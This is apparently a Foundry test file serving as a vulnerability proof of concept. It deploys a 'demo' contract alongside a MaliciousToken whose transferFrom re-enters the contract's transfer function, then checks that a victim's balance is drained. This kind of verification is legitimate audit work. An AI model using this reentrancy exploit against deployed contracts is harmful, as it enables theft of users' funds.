// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xd5967fed03e85d1cce44cab284695b41bc675b5c.sol";

contract DemoReentrancyTest is Test {
    demo public vulnerableContract;
    MaliciousToken public malToken;
    address public constant FEE_COLLECTOR = address(0x9);
    address public victim = address(0x123);
    address public recipient = address(0x456);

    function setUp() public {
        vulnerableContract = new demo();
        malToken = new MaliciousToken(address(vulnerableContract));
        
        // Mint enough tokens for victim to cover original transfer and reentrant calls
        malToken.mint(victim, 2000 ether);
        // Fee collector starts with zero balance
        malToken.mint(FEE_COLLECTOR, 0);
    }

    function testReentrancyOccurrence() public {
        address[] memory recipients = new address[](1);
        recipients[0] = recipient;
        
        console2.log("--- BEFORE-Trigger ---");
        uint256 initialReentrancyCount = malToken.reentrancyCount();
        uint256 initialVictimBalance = malToken.balanceOf(victim);
        uint256 initialTokenContractBalance = malToken.balanceOf(address(malToken));
        uint256 initialFeeCollectorBalance = malToken.balanceOf(FEE_COLLECTOR);
        
        console2.log("- ReentrancyCount:", initialReentrancyCount);
        console2.log("- Victim balance:", initialVictimBalance);
        console2.log("- TokenContract balance:", initialTokenContractBalance);
        console2.log("- FeeCollector balance:", initialFeeCollectorBalance);
        
        console2.log("--- Trigger Transfer ---");
        vm.prank(victim);
        vulnerableContract.transfer(
            victim,
            address(malToken),
            recipients,
            100 ether
        );
        
        console2.log("--- AFTER-Trigger ---");
        uint256 finalReentrancyCount = malToken.reentrancyCount();
        uint256 finalVictimBalance = malToken.balanceOf(victim);
        uint256 finalTokenContractBalance = malToken.balanceOf(address(malToken));
        uint256 finalFeeCollectorBalance = malToken.balanceOf(FEE_COLLECTOR);
        
        console2.log("- ReentrancyCount:", finalReentrancyCount);
        console2.log("- Victim balance:", finalVictimBalance);
        console2.log("- TokenContract balance:", finalTokenContractBalance);
        console2.log("- FeeCollector balance:", finalFeeCollectorBalance);
        
        // Compute differences
        uint256 reentrancyDiff = finalReentrancyCount - initialReentrancyCount;
        uint256 victimLoss = initialVictimBalance - finalVictimBalance;
        uint256 tokenContractGain = finalTokenContractBalance - initialTokenContractBalance;
        uint256 feeCollectorChange = finalFeeCollectorBalance - initialFeeCollectorBalance;
        
        // Log differential results
        console2.log("Verification Results:");
        console2.log("Reentrancy count changed by:", reentrancyDiff);
        console2.log("Victim's balance reduced by:", victimLoss);
        console2.log("Token contract's balance increased by:", tokenContractGain);
        console2.log("Fee collector's balance changed by:", feeCollectorChange);
        
        // Evaluate vulnerability existence
        if (reentrancyDiff == 2 && 
            victimLoss == 300 ether && 
            tokenContractGain == 198 ether && 
            feeCollectorChange == 0) {
            console2.log("Vulnerability Exists: Reentrancy occurred twice with victim losing 300 ether, token contract gaining 198 ether, and fee collector unchanged");
        } else {
            console2.log("Vulnerability not Exist: State changes did not match expected vulnerability behavior");
        }
    }
}

contract MaliciousToken {
    address public vulnerableContract;
    uint256 public reentrancyCount;
    bool private reentrancyLock;
    
    mapping(address => uint256) public balanceOf;
    
    constructor(address _vulnerableContract) {
        vulnerableContract = _vulnerableContract;
    }
    
    function mint(address to, uint256 amount) public {
        balanceOf[to] += amount;
    }
    
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        
        if (amount > 0 && !reentrancyLock) {
            reentrancyLock = true;
            reentrancyCount++;
            
            address[] memory recipients = new address[](1);
            recipients[0] = address(this);
            
            demo(vulnerableContract).transfer(
                from,
                address(this),
                recipients,
                100 ether
            );
            
            reentrancyLock = false;
        }
        return true;
    }
}